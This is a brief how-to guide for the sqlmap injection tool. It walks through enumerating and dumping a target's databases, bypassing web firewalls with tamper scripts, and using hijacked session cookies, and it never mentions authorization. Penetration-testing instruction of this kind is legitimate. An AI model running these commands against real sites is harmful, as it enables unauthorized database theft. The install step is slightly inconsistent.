### Guide to Using SQLmap

1. **Installation:**

   You can install SQLmap via `pip` or clone it from GitHub:

   ```bash
   sudo apt-get install sqlmap
   ```

   Alternatively, you can clone the repository:

   ```bash
   git clone https://github.com/sqlmapproject/sqlmap.git
   cd sqlmap
   ```

2. **Basic Usage:**

   The basic syntax to run SQLmap is:

   ```bash
   sqlmap -u <URL>
   ```

   For example, to test a vulnerable URL:****

   ```bash
   sqlmap -u "http://example.com/vulnerable_page?id=1"
   ```

3. **Identify Database Information:**

   To enumerate the databases, use the `--dbs` option:

   ```bash
   sqlmap -u "http://example.com/vulnerable_page?id=1" --dbs
   ```

   This command will list all databases on the server if the parameter is vulnerable.

4. **Select a Specific Database:**

   Once you have identified the databases, select one to enumerate its tables:

   ```bash
   sqlmap -u "http://example.com/vulnerable_page?id=1" -D <database_name> --tables
   ```

   Replace `<database_name>` with the actual database name.

5. **Retrieve Table Columns:**

   After identifying the tables, get the columns of a specific table:

   ```bash
   sqlmap -u "http://example.com/vulnerable_page?id=1" -D <database_name> -T <table_name> --columns
   ```

   Replace `<table_name>` with the actual table name.

6. **Dump Table Data:**

   To dump the data from a specific table, use:

   ```bash
   sqlmap -u "http://example.com/vulnerable_page?id=1" -D <database_name> -T <table_name> --dump
   ```

   This will retrieve and display the data from the specified table.

7. **Advanced Options:**

   - **Bypass WAF:** If a Web Application Firewall (WAF) is present, use:
     ```bash
     sqlmap -u "http://example.com/vulnerable_page?id=1" --tamper=<tamper_script>
     ```
     SQLmap includes several tamper scripts designed to bypass WAFs.

   - **Authentication:** For pages that require login, use session cookies:
     ```bash
     sqlmap -u "http://example.com/vulnerable_page?id=1" --cookie="PHPSESSID=<session_id>"
     ```

   - **POST Requests:** To test POST parameters:
     ```bash
     sqlmap -u "http://example.com/vulnerable_page" --data="param1=value1&param2=value2"
     ```

   - **Specify Database Management System (DBMS):** To optimize the attack for a specific DBMS:
     ```bash
     sqlmap -u "http://example.com/vulnerable_page?id=1" --dbms=mysql
     ```

   - **Level and Risk:** Increase the level and risk to test more parameters and payloads:
     ```bash
     sqlmap -u "http://example.com/vulnerable_page?id=1" --level=5 --risk=3
     ```

### Example of a Complete SQLmap Command:

Here’s an example combining several options:

```bash
sqlmap -u "http://example.com/vulnerable_page?id=1" --cookie="PHPSESSID=abcdef123456" --dbms=mysql --level=5 --risk=3 --dbs
```
